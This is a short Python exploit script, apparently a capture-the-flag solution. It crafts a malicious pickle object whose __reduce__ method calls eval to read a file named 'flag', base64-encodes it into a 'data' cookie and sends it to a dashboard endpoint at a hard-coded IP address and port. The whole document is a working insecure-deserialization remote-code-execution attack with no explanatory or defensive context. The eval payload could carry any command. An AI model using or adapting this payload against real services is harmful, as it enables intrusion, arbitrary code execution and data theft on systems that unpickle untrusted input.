import pickle
import base64
import requests
# RCE payload, 34.159.73.134:32184
class RCE:
    def __reduce__(self): # read and return the content of flag
        return (eval, ("open('flag').read()",))
def send_payload():
    payload = pickle.dumps(RCE(), protocol=2)
    payload = base64.urlsafe_b64encode(payload)
    headers = {
        "Cookie": f"data={payload.decode()}"
    }
    response = requests.get('http://34.159.73.134:32184/dashboard', headers=headers)
    print(response.text)

send_payload()